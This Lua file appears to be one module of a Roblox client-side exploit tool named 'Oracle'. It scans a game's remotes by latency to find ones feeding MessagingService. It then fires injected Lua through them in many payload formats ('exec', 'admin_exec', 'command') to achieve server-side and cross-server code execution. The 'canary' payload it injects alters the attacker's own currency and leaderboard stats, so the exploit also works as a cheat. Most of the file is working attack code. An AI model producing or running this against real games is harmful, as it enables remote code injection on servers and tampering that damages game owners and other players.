-- Oracle // 32_msgbus.lua
-- MSGBUS — MessagingService Execution Bus
-- Identifies remotes that call PublishAsync with client-controlled data
-- Injects canary payloads and detects same-server and cross-server execution
-- Vector 2: Client → Remote → PublishAsync("channel", payload)
--                    → SubscribeAsync handler evaluates payload
--                    → loadstring() executes on every subscribed server
local G      = ...
local C      = G.C
local TI     = G.TI
local mk     = G.mk
local tw     = G.tw
local corner = G.corner
local stroke = G.stroke
local pad    = G.pad
local listV  = G.listV
local listH  = G.listH
local mkRow  = G.mkRow
local mkSep  = G.mkSep
local vs     = G.vs
local snap   = G.snap
local dif    = G.dif
local hookR  = G.hookR
local rlog   = G.rlog
local CFG    = G.CFG
local CON    = G.CON
local RepS   = G.RepS
local LP     = G.LP

-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-- MSGBUS ENGINE
-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

-- Latency windows (ms)
-- Direct handler:             5  –  40ms
-- DataStore access:          80  – 400ms
-- MessagingService publish:  40  – 180ms   ← our target window
-- Both DS + Messaging:      120  – 500ms
local MSG_MIN  = 40    -- below = probably no async
local MSG_SURE = 120   -- above = likely MessagingService or DataStore
local MSG_MAX  = 250   -- above = DataStore, not pure messaging

-- Canary confirmation windows (ms from fire time)
local SAME_SERVER_WINDOW = 500    -- < 500ms = same-server subscription
local CROSS_SERVER_MAX   = 12000  -- up to 12s for cross-server round-trip

-- Distinctive delta that cannot be coincidental
local CANARY_DELTA = 6666  -- different from DSCHAN (7777) so we can distinguish

-- Common MessagingService channel names games use
local COMMON_CHANNELS = {
    "GlobalChat", "AdminMessages", "BanChannel", "ServerEvents",
    "CrossServer", "Broadcast", "AdminBroadcast", "GlobalBan",
    "ServerSync", "GameEvents", "GlobalEvents", "AdminChannel",
    "MainChannel", "ChatChannel", "SystemMessages", "AdminExec",
    "GlobalSync", "ServerBroadcast", "CommandChannel", "ExecChannel",
}

-- Common payload structures for MessagingService-connected remotes
-- Admin/broadcast remotes typically accept these formats
local MSG_PAYLOADS = {
    -- Broadcast/admin patterns
    {tag="broadcast_msg",  fn=function(s) return {{action="broadcast", message=s}} end},
    {tag="admin_msg",      fn=function(s) return {{action="adminMsg",  text=s}} end},
    {tag="global_msg",     fn=function(s) return {{type="global",      message=s, channel="broadcast"}} end},
    {tag="exec_broadcast", fn=function(s) return {{action="exec",      code=s,    broadcast=true}} end},
    {tag="server_msg",     fn=function(s) return {{message=s,          global=true}} end},
    {tag="chat_broadcast", fn=function(s) return {{text=s,             channel="all", global=true}} end},
    {tag="command",        fn=function(s) return {{command=s,          args={},   broadcast=true}} end},
    {tag="publish_direct", fn=function(s) return {s} end},
    {tag="publish_table",  fn=function(s) return {{data=s}} end},
    {tag="admin_exec",     fn=function(s) return {{script=s,           execute=true, all=true}} end},
    {tag="cross_server",   fn=function(s) return {{payload=s,          crossServer=true}} end},
    {tag="sync_event",     fn=function(s) return {{event="sync",       data=s}} end},
}

-- Build canary script for MessagingService execution
-- Same strategy as DSCHAN but with a different delta
-- so both can be active simultaneously without confusion
local function buildMsgCanary(playerName)
    return ([[
pcall(function()
    local ok,p=pcall(function()
        return game:GetService("Players")["%s"]
    end)
    if not ok or not p then return end
    local ls=p:FindFirstChild("leaderstats")
    if ls then
        for _,v in ipairs(ls:GetChildren()) do
            if v:IsA("NumberValue") or v:IsA("IntValue") then
                v.Value=v.Value+%d
            end
        end
    end
    for _,name in ipairs({"Coins","Cash","Points","Kills","Score","XP","Gems","Level"}) do
        local sv=p:FindFirstChild(name)
        if sv and sv.Value~=nil then
            pcall(function() sv.Value=sv.Value+%d end)
        end
    end
end)
]]):format(playerName, CANARY_DELTA, CANARY_DELTA)
end

-- Snapshot numeric stats for canary confirmation
local function snapshotStats()
    local s = {}
    local function cap(parent, prefix)
        if not parent then return end
        local ok,ch=pcall(function() return parent:GetChildren() end)
        if not ok then return end
        for _,v in ipairs(ch) do
            local ok2,val=pcall(function() return v.Value end)
            if ok2 and type(val)=="number" then
                s[prefix.."."..v.Name]=val
            end
        end
    end
    cap(LP:FindFirstChild("leaderstats"),"leaderstats")
    cap(LP,"player")
    return s
end

local function detectCanary(before, after)
    local hits={}
    for key,bval in pairs(before) do
        local aval=after[key]
        if aval and aval~=bval then
            local delta=aval-bval
            if math.abs(delta)==CANARY_DELTA then
                table.insert(hits,{path=key,before=bval,after=aval,delta=delta,exact=true})
            elseif math.abs(delta)>50 then
                table.insert(hits,{path=key,before=bval,after=aval,delta=delta,exact=false})
            end
        end
    end
    return hits
end

-- Probe a remote for MessagingService latency signature
-- MessagingService:PublishAsync is async but faster than DataStore
-- Fires 4 samples and computes statistics
local function probeLatency(remote, samples)
    local times={}
    for i=1,samples do
        local t0=tick()
        pcall(function()
            if remote:IsA("RemoteFunction") then
                remote:InvokeServer()
            else
                remote:FireServer()
            end
        end)
        table.insert(times,(tick()-t0)*1000)
        task.wait(0.15)
    end
    table.sort(times)
    local med=times[math.ceil(#times/2)]
    local p75=times[math.max(1,math.floor(#times*0.75))]
    local p95=times[math.max(1,math.floor(#times*0.95))]
    local mx=times[#times]
    return med,p75,p95,mx
end

-- Classify latency into remote type
local function classifyLatency(med, p95, mx)
    -- MessagingService: moderate latency, consistent (low variance)
    -- DataStore: higher latency, more variance
    -- Pure messaging signature: 40-200ms median, tight p95
    local variance = p95 - med
    if med < MSG_MIN then
        return "SYNC", "Fast synchronous handler"
    elseif med >= MSG_SURE and variance > 100 then
        return "DATASTORE", "High latency + high variance = DataStore"
    elseif med >= MSG_MIN and med <= MSG_MAX then
        if variance < 60 then
            return "MESSAGING_LIKELY", "Moderate latency, low variance = MessagingService"
        else
            return "MESSAGING_POSSIBLE", "Moderate latency, some variance"
        end
    elseif med > MSG_MAX then
        return "DATASTORE_OR_BOTH", "High latency = DataStore (may also use Messaging)"
    end
    return "UNKNOWN", "Inconclusive"
end

-- Inject canary into a remote and monitor for same-server and cross-server execution
local function injectMsgCanary(remote, canaryScript, logFn)
    local before=snapshotStats()
    local fired=false
    local fireTime=tick()

    -- Try all payload formats
    for _,payload in ipairs(MSG_PAYLOADS) do
        task.wait(0.04)
        local args=payload.fn(canaryScript)
        local ok=pcall(function()
            if remote:IsA("RemoteFunction") then
                remote:InvokeServer(table.unpack(args))
            else
                remote:FireServer(table.unpack(args))
            end
        end)
        if ok then fired=true end
    end

    if not fired then
        if logFn then logFn("INFO","All payloads rejected by "..remote.Name) end
        return nil
    end

    if logFn then
        logFn("INFO",
            ("Canary fired via %s — monitoring for execution"):format(remote.Name),
            "Checking same-server window (<500ms) then cross-server (<12s)")
    end

    -- Monitoring strategy:
    -- Phase A: Same-server window — check every 100ms for 500ms
    -- Phase B: Cross-server window — check at 1s, 2s, 3s, 5s, 8s, 12s
    
    -- Phase A: same-server subscription check
    local deadline_a = fireTime + SAME_SERVER_WINDOW/1000
    while tick() < deadline_a do
        task.wait(0.1)
        local after=snapshotStats()
        local hits=detectCanary(before,after)
        if #hits > 0 then
            local elapsed=(tick()-fireTime)*1000
            if logFn then
                logFn("FINDING",
                    ("SAME-SERVER EXECUTION at +%.0fms on %s"):format(
                        elapsed, remote.Name),
                    ("Delta: %s %s->%s (+%d)%s"):format(
                        hits[1].path,
                        tostring(hits[1].before),
                        tostring(hits[1].after),
                        hits[1].delta,
                        hits[1].exact and " EXACT CANARY" or ""),
                    true)
            end
            return {
                remote    = remote.Name,
                execution = "SAME_SERVER",
                elapsedMs = elapsed,
                hits      = hits,
                confirmed = hits[1].exact,
            }
        end
    end

    if logFn then
        logFn("INFO","No same-server execution — checking cross-server window")
    end

    -- Phase B: cross-server window
    local checkPoints={1,2,3,5,8,12}
    local lastCheck=tick()
    for _,delay in ipairs(checkPoints) do
        local target=fireTime+delay
        while tick()<target do task.wait(0.3) end

        local after=snapshotStats()
        local hits=detectCanary(before,after)
        if #hits>0 then
            local elapsed=(tick()-fireTime)*1000
            if logFn then
                logFn("FINDING",
                    ("CROSS-SERVER EXECUTION at +%.0fms on %s"):format(
                        elapsed, remote.Name),
                    ("Delta: %s +%d%s — another server evaluated the payload"):format(
                        hits[1].path, hits[1].delta,
                        hits[1].exact and " (EXACT)" or ""),
                    true)
            end
            return {
                remote    = remote.Name,
                execution = "CROSS_SERVER",
                elapsedMs = elapsed,
                hits      = hits,
                confirmed = hits[1].exact,
            }
        end

        if logFn then
            logFn("INFO",("t+%ds: no execution"):format(delay))
        end
    end

    return nil
end

-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-- MSGBUS PAGE UI
-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

local P_MSG = mk("Frame",{BackgroundTransparency=1,BorderSizePixel=0,
    Size=UDim2.fromScale(1,1),Visible=false,ZIndex=3},CON)

-- topbar
local TOPBAR=mk("Frame",{BackgroundColor3=C.SURFACE,BorderSizePixel=0,
    Size=UDim2.new(1,0,0,32),ZIndex=4},P_MSG)
stroke(C.BORDER,1,TOPBAR)
mk("Frame",{BackgroundColor3=C.BORDER,BorderSizePixel=0,
    Size=UDim2.new(1,0,0,1),Position=UDim2.new(0,0,1,-1),ZIndex=5},TOPBAR)
mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.GothamBold,
    Text="MSGBUS — MESSAGINGSERVICE EXECUTION BUS",
    TextColor3=Color3.fromRGB(140,80,255),TextSize=11,
    Size=UDim2.new(0,360,1,0),Position=UDim2.new(0,14,0,0),
    TextXAlignment=Enum.TextXAlignment.Left,ZIndex=5},TOPBAR)
local MSG_STATUS=mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.Code,
    Text="idle",TextColor3=C.MUTED,TextSize=9,
    Size=UDim2.new(1,-374,1,0),Position=UDim2.new(0,370,0,0),
    TextXAlignment=Enum.TextXAlignment.Right,ZIndex=5},TOPBAR)

-- control bar
local CTRLBAR=mk("Frame",{BackgroundColor3=C.SURFACE,BorderSizePixel=0,
    Position=UDim2.new(0,0,0,32),Size=UDim2.new(1,0,0,30),ZIndex=4},P_MSG)
stroke(C.BORDER,1,CTRLBAR)
mk("Frame",{BackgroundColor3=C.BORDER,BorderSizePixel=0,
    Size=UDim2.new(1,0,0,1),Position=UDim2.new(0,0,1,-1),ZIndex=4},CTRLBAR)

local function mkMBtn(txt,col,x)
    local b=mk("TextButton",{AutoButtonColor=false,
        BackgroundColor3=col,BorderSizePixel=0,
        Font=Enum.Font.GothamBold,Text=txt,TextColor3=Color3.fromRGB(8,8,12),TextSize=9,
        Size=UDim2.new(0,0,0,22),AutomaticSize=Enum.AutomaticSize.X,
        Position=UDim2.new(0,x,0.5,-11),ZIndex=5},CTRLBAR)
    corner(5,b)
    mk("UIPadding",{PaddingLeft=UDim.new(0,8),PaddingRight=UDim.new(0,8)},b)
    return b
end

local PROBE_BTN  = mkMBtn("Probe Remotes",  Color3.fromRGB(140,80,255),   8)
local CANARY_BTN = mkMBtn("Inject Canary",  Color3.fromRGB(255,80,80),    150)
local FULL_BTN   = mkMBtn("Full Chain Test",Color3.fromRGB(255,200,60),   274)
local STOP_BTN   = mkMBtn("Stop",           Color3.fromRGB(60,15,15),     410)
STOP_BTN.TextColor3=Color3.fromRGB(255,80,80)
stroke(Color3.fromRGB(255,80,80),1,STOP_BTN)

-- body
local BODY=mk("Frame",{BackgroundTransparency=1,BorderSizePixel=0,
    Position=UDim2.new(0,0,0,62),Size=UDim2.new(1,0,1,-62),ZIndex=3},P_MSG)

-- left: results
local ML=mk("Frame",{BackgroundTransparency=1,BorderSizePixel=0,
    Size=UDim2.new(0,240,1,0),ZIndex=3},BODY)
mk("Frame",{BackgroundColor3=C.BORDER,BorderSizePixel=0,
    Size=UDim2.new(0,1,1,0),Position=UDim2.new(1,-1,0,0),ZIndex=4},ML)
local RES_SCROLL=mk("ScrollingFrame",{BackgroundTransparency=1,BorderSizePixel=0,
    Size=UDim2.fromScale(1,1),ScrollBarThickness=3,ScrollBarImageColor3=C.ACCDIM,
    CanvasSize=UDim2.fromScale(0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y,ZIndex=4},ML)
pad(6,8,RES_SCROLL); listV(RES_SCROLL,5)

-- right: log
local MR=mk("Frame",{BackgroundTransparency=1,BorderSizePixel=0,
    Position=UDim2.new(0,241,0,0),Size=UDim2.new(1,-241,1,0),ZIndex=3},BODY)
local PROG_BG=mk("Frame",{BackgroundColor3=C.CARD,BorderSizePixel=0,
    Size=UDim2.new(1,0,0,3),ZIndex=5},MR)
local PROG_BAR=mk("Frame",{BackgroundColor3=Color3.fromRGB(140,80,255),
    BorderSizePixel=0,Size=UDim2.new(0,0,1,0),ZIndex=6},PROG_BG)
corner(2,PROG_BAR)
local LOG_SCROLL=mk("ScrollingFrame",{BackgroundTransparency=1,BorderSizePixel=0,
    Position=UDim2.new(0,0,0,3),Size=UDim2.new(1,0,1,-3),
    ScrollBarThickness=4,ScrollBarImageColor3=C.ACCDIM,
    CanvasSize=UDim2.fromScale(0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y,
    ScrollingDirection=Enum.ScrollingDirection.Y,ZIndex=4},MR)
pad(10,8,LOG_SCROLL); listV(LOG_SCROLL,3)
local LOG_EMPTY=mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.Code,
    Text="MSGBUS probes the MessagingService execution bus.\n\n"..
         "Vector: Client fires a remote → server calls\n"..
         "PublishAsync(channel, payload) → every subscribed\n"..
         "server's handler receives and evaluates it.\n\n"..
         "Key insight: servers often subscribe to their own\n"..
         "broadcast channels. Same-server execution shows\n"..
         "up in <500ms. Cross-server in 500ms-12s.\n\n"..
         "Canary delta: +"..tostring(6666).." on any numeric stat\n"..
         "(distinct from DSCHAN's +7777 so both can\n"..
         "run simultaneously without confusion).\n\n"..
         "Probe Remotes  — find MessagingService latency\n"..
         "Inject Canary  — fire canary through selected remote\n"..
         "Full Chain Test — automated end-to-end",
    TextColor3=C.MUTED,TextSize=10,TextWrapped=true,
    Size=UDim2.new(1,0,0,210),TextXAlignment=Enum.TextXAlignment.Center,
    ZIndex=5,LayoutOrder=1},LOG_SCROLL)

-- log helpers
local mN=0
local function addLog(tag,msg,detail,hi)
    LOG_EMPTY.Visible=false; mN=mN+1; mkRow(tag,msg,detail,hi,LOG_SCROLL,mN)
    task.defer(function()
        LOG_SCROLL.CanvasPosition=Vector2.new(0,LOG_SCROLL.AbsoluteCanvasSize.Y)
    end)
end
local function addLogSep(txt) mN=mN+1; mkSep(txt,LOG_SCROLL,mN) end
local function clearLog()
    for _,c in ipairs(LOG_SCROLL:GetChildren()) do
        if not c:IsA("UIListLayout") and not c:IsA("UIPadding") then c:Destroy() end
    end
    mN=0; LOG_EMPTY.Visible=true
    tw(PROG_BAR,TI.fast,{Size=UDim2.new(0,0,1,0)})
end

-- result cards
local MSG_RESULTS = {}
local SEL_RESULT  = nil

local COL_MSG_LIKELY   = Color3.fromRGB(140,80,255)
local COL_MSG_POSSIBLE = Color3.fromRGB(180,120,255)
local COL_DS           = Color3.fromRGB(255,160,40)
local COL_SYNC         = Color3.fromRGB(80,140,255)
local COL_EXEC         = Color3.fromRGB(80,210,100)

local function labelColor(label)
    if label=="MESSAGING_LIKELY"   then return COL_MSG_LIKELY
    elseif label=="MESSAGING_POSSIBLE" then return COL_MSG_POSSIBLE
    elseif label=="DATASTORE" or label=="DATASTORE_OR_BOTH" then return COL_DS
    else return COL_SYNC end
end

local function rebuildResultCards()
    for _,c in ipairs(RES_SCROLL:GetChildren()) do
        if not c:IsA("UIListLayout") and not c:IsA("UIPadding") then c:Destroy() end
    end
    for i,r in ipairs(MSG_RESULTS) do
        local col=r.execResult and COL_EXEC or labelColor(r.label)
        local card=mk("TextButton",{AutoButtonColor=false,
            BackgroundColor3=C.CARD,BorderSizePixel=0,Text="",
            Size=UDim2.new(1,0,0,0),AutomaticSize=Enum.AutomaticSize.Y,
            ZIndex=4,LayoutOrder=i},RES_SCROLL)
        corner(6,card); stroke(col,1,card); pad(8,6,card); listV(card,4)

        local hrow=mk("Frame",{BackgroundTransparency=1,BorderSizePixel=0,
            Size=UDim2.new(1,0,0,16),ZIndex=5,LayoutOrder=1},card)
        listH(hrow,5)
        local badge=mk("Frame",{BackgroundColor3=col,BorderSizePixel=0,
            Size=UDim2.new(0,0,1,0),AutomaticSize=Enum.AutomaticSize.X,ZIndex=6},hrow)
        corner(3,badge)
        mk("UIPadding",{PaddingLeft=UDim.new(0,3),PaddingRight=UDim.new(0,3)},badge)
        mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.GothamBold,
            Text=r.execResult and
                (r.execResult.execution=="SAME_SERVER" and "SAME-SVR EXEC" or "CROSS-SVR EXEC")
                or r.label:gsub("_"," "),
            TextColor3=Color3.fromRGB(8,8,12),TextSize=7,
            Size=UDim2.new(0,0,1,0),AutomaticSize=Enum.AutomaticSize.X,ZIndex=7},badge)
        mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.GothamBold,
            Text=r.name,TextColor3=col,TextSize=10,
            Size=UDim2.new(1,-90,1,0),TextXAlignment=Enum.TextXAlignment.Left,
            ZIndex=6,LayoutOrder=2},hrow)

        mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.Code,
            Text=("med %.0fms  p95 %.0fms  — %s"):format(
                r.median, r.p95, r.desc),
            TextColor3=C.MUTED,TextSize=8,TextWrapped=true,
            Size=UDim2.new(1,0,0,0),AutomaticSize=Enum.AutomaticSize.Y,
            TextXAlignment=Enum.TextXAlignment.Left,
            ZIndex=5,LayoutOrder=2},card)

        if r.execResult then
            mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.GothamBold,
                Text=("Executed at +%.0fms (%s)"):format(
                    r.execResult.elapsedMs,
                    r.execResult.execution),
                TextColor3=COL_EXEC,TextSize=9,
                Size=UDim2.new(1,0,0,13),TextXAlignment=Enum.TextXAlignment.Left,
                ZIndex=5,LayoutOrder=3},card)
        end

        local captured=r
        card.MouseButton1Click:Connect(function()
            SEL_RESULT=captured
            MSG_STATUS.Text="selected: "..r.name
            MSG_STATUS.TextColor3=COL_MSG_LIKELY
        end)
    end
end

-- collect remotes
local function collectRemotes(limit)
    local remotes={}
    local map=G.DISCOVERY_MAP
    if map then
        for _,r in ipairs(map.remoteEvents or {}) do
            if r.instance then table.insert(remotes,r.instance) end
        end
        for _,r in ipairs(map.remoteFunctions or {}) do
            if r.instance then table.insert(remotes,r.instance) end
        end
    end
    if #remotes==0 then
        local function sc(root)
            local ok,d=pcall(function() return root:GetDescendants() end)
            if not ok then return end
            for _,x in ipairs(d) do
                if x:IsA("RemoteEvent") or x:IsA("RemoteFunction") then
                    table.insert(remotes,x)
                end
            end
        end
        sc(RepS); sc(workspace)
    end
    if limit then
        local cut={}
        for i=1,math.min(limit,#remotes) do table.insert(cut,remotes[i]) end
        return cut
    end
    return remotes
end

-- state
local running=false
local aborted=false

STOP_BTN.MouseButton1Click:Connect(function()
    aborted=true
    MSG_STATUS.Text="stopped"; MSG_STATUS.TextColor3=C.MUTED
    running=false
end)

-- ── PROBE REMOTES ─────────────────────────────────────────────────────────────
PROBE_BTN.MouseButton1Click:Connect(function()
    if running then return end
    running=true; aborted=false
    clearLog(); MSG_RESULTS={}
    tw(PROBE_BTN,TI.fast,{BackgroundColor3=Color3.fromRGB(50,20,100)})
    MSG_STATUS.Text="probing..."; MSG_STATUS.TextColor3=COL_MSG_LIKELY

    local remotes=collectRemotes(16)
    addLogSep(("MSGBUS PROBE — %d remotes x 4 samples"):format(#remotes))
    addLog("INFO",
        ("MessagingService window: %.0f–%.0fms median"):format(MSG_MIN, MSG_MAX),
        "Tight variance distinguishes Messaging from DataStore")

    task.spawn(function()
        for i,remote in ipairs(remotes) do
            if aborted then break end
            tw(PROG_BAR,TI.fast,{Size=UDim2.new(i/#remotes,0,1,0)})
            MSG_STATUS.Text=("probing %d/%d: %s"):format(i,#remotes,remote.Name)

            local med,p75,p95,mx=probeLatency(remote,4)
            local label,desc=classifyLatency(med,p95,mx)

            local result={
                name=remote.Name, remote=remote,
                median=med, p75=p75, p95=p95, max=mx,
                label=label, desc=desc,
                msgLikely=label=="MESSAGING_LIKELY" or label=="MESSAGING_POSSIBLE",
            }
            table.insert(MSG_RESULTS,result)

            local hi=label=="MESSAGING_LIKELY"
            addLog(hi and "FINDING" or "INFO",
                ("[%s] %s — med %.0fms p95 %.0fms"):format(
                    label, remote.Name, med, p95),
                desc, hi)
        end

        table.sort(MSG_RESULTS,function(a,b)
            if a.label=="MESSAGING_LIKELY" ~= (b.label=="MESSAGING_LIKELY") then
                return a.label=="MESSAGING_LIKELY"
            end
            return a.median>b.median
        end)
        rebuildResultCards()

        local msgCount=0
        for _,r in ipairs(MSG_RESULTS) do
            if r.msgLikely then msgCount=msgCount+1 end
        end
        addLogSep(("PROBE COMPLETE — %d MessagingService candidate(s)"):format(msgCount))
        MSG_STATUS.Text=msgCount.." candidate(s)"
        MSG_STATUS.TextColor3=msgCount>0 and COL_MSG_LIKELY or C.MUTED
        tw(PROG_BAR,TI.fast,{Size=UDim2.new(1,0,1,0)})
        tw(PROBE_BTN,TI.fast,{BackgroundColor3=COL_MSG_LIKELY})
        running=false
    end)
end)

-- ── INJECT CANARY ─────────────────────────────────────────────────────────────
CANARY_BTN.MouseButton1Click:Connect(function()
    if running then return end
    local target=SEL_RESULT
    if not target then
        for _,r in ipairs(MSG_RESULTS) do
            if r.msgLikely then target=r; break end
        end
    end
    if not target then
        addLog("INFO","No MessagingService remote selected",
            "Run Probe Remotes first, then click a result card to select it")
        return
    end

    running=true; aborted=false
    tw(CANARY_BTN,TI.fast,{BackgroundColor3=Color3.fromRGB(80,20,20)})
    MSG_STATUS.Text="injecting..."; MSG_STATUS.TextColor3=Color3.fromRGB(255,80,80)

    addLogSep("CANARY INJECTION — "..target.name)
    addLog("INFO",
        ("Player: %s  Delta marker: +%d"):format(LP.Name, CANARY_DELTA),
        "Same-server window: <500ms  Cross-server: up to 12s")

    local canary=buildMsgCanary(LP.Name)

    task.spawn(function()
        local result=injectMsgCanary(target.remote, canary, addLog)
        target.execResult=result
        rebuildResultCards()

        if result then
            addLogSep("VECTOR 2 CONFIRMED")
            addLog("FINDING","MessagingService Execution Bus confirmed",
                ("%s execution via %s at +%.0fms"):format(
                    result.execution, target.name, result.elapsedMs),
                true)
            if result.execution=="CROSS_SERVER" then
                addLog("FINDING",
                    "Cross-server reach: every subscribed server received this payload",
                    "All game instances running this game processed your script",
                    true)
            end
            MSG_STATUS.Text="VECTOR 2 CONFIRMED"
            MSG_STATUS.TextColor3=COL_EXEC
        else
            MSG_STATUS.Text="no execution detected"
            MSG_STATUS.TextColor3=C.MUTED
        end

        tw(CANARY_BTN,TI.fast,{BackgroundColor3=Color3.fromRGB(255,80,80)})
        running=false
    end)
end)

-- ── FULL CHAIN TEST ───────────────────────────────────────────────────────────
FULL_BTN.MouseButton1Click:Connect(function()
    if running then return end
    running=true; aborted=false
    clearLog(); MSG_RESULTS={}
    tw(FULL_BTN,TI.fast,{BackgroundColor3=Color3.fromRGB(80,60,10)})
    MSG_STATUS.Text="full chain test..."; MSG_STATUS.TextColor3=Color3.fromRGB(255,200,60)

    local remotes=collectRemotes(14)
    addLogSep(("MSGBUS FULL CHAIN — %d remotes"):format(#remotes))

    task.spawn(function()
        -- Phase 1: probe
        addLog("INFO","Phase 1: MessagingService latency classification")
        for i,remote in ipairs(remotes) do
            if aborted then break end
            tw(PROG_BAR,TI.fast,{Size=UDim2.new((i/#remotes)*0.35,0,1,0)})
            MSG_STATUS.Text=("phase 1: %s"):format(remote.Name)
            local med,p75,p95,mx=probeLatency(remote,3)
            local label,desc=classifyLatency(med,p95,mx)
            local r={name=remote.Name,remote=remote,
                median=med,p75=p75,p95=p95,max=mx,
                label=label,desc=desc,
                msgLikely=label=="MESSAGING_LIKELY" or label=="MESSAGING_POSSIBLE"}
            table.insert(MSG_RESULTS,r)
            addLog(r.msgLikely and "FINDING" or "INFO",
                ("[%s] %s"):format(label,remote.Name),
                ("med %.0fms — %s"):format(med,desc),
                r.msgLikely)
        end

        local msgRemotes={}
        for _,r in ipairs(MSG_RESULTS) do
            if r.msgLikely then table.insert(msgRemotes,r) end
        end
        rebuildResultCards()

        if #msgRemotes==0 then
            addLog("CLEAN","No MessagingService candidates found",
                "No remotes show the 40-200ms low-variance signature")
            addLogSep("CHAIN TEST COMPLETE — No Messaging channel detected")
            MSG_STATUS.Text="no candidates found"
            MSG_STATUS.TextColor3=C.MUTED
            tw(FULL_BTN,TI.fast,{BackgroundColor3=Color3.fromRGB(255,200,60)})
            running=false; return
        end

        addLog("INFO",
            ("%d candidate(s) — proceeding to canary injection"):format(#msgRemotes))
        task.wait(0.5)

        -- Phase 2: canary injection
        addLogSep(("Phase 2: Canary into %d candidate(s)"):format(#msgRemotes))
        local canary=buildMsgCanary(LP.Name)

        for i,target in ipairs(msgRemotes) do
            if aborted then break end
            tw(PROG_BAR,TI.fast,{Size=UDim2.new(0.35+(i/#msgRemotes)*0.65,0,1,0)})
            MSG_STATUS.Text=("phase 2: %s"):format(target.name)

            addLog("INFO",("Canary %d/%d: %s"):format(i,#msgRemotes,target.name))
            local result=injectMsgCanary(target.remote, canary, addLog)

            if result then
                target.execResult=result
                rebuildResultCards()
                addLogSep("VECTOR 2 CONFIRMED")
                addLog("FINDING",
                    ("MessagingService Execution Bus: %s via %s"):format(
                        result.execution, target.name),
                    ("Payload executed on "..
                        (result.execution=="SAME_SERVER" and "THIS server" or
                         "a REMOTE server").." — delay %.0fms"):format(
                        result.elapsedMs),
                    true)
                MSG_STATUS.Text="VECTOR 2 CONFIRMED"
                MSG_STATUS.TextColor3=COL_EXEC
                break
            end
            task.wait(0.3)
        end

        tw(PROG_BAR,TI.fast,{Size=UDim2.new(1,0,1,0)})
        if not aborted then
            addLogSep("MSGBUS FULL CHAIN COMPLETE")
        end
        tw(FULL_BTN,TI.fast,{BackgroundColor3=Color3.fromRGB(255,200,60)})
        running=false
    end)
end)

-- export
G.MSGBUS_RESULTS     = MSG_RESULTS
G.msgbus_buildCanary = buildMsgCanary
G.msgbus_snapshot    = snapshotStats
G.msgbus_detect      = detectCanary

if G.addTab then
    G.addTab("msgbus","MSGBUS",P_MSG)
else
    warn("[Oracle] G.addTab not found")
end
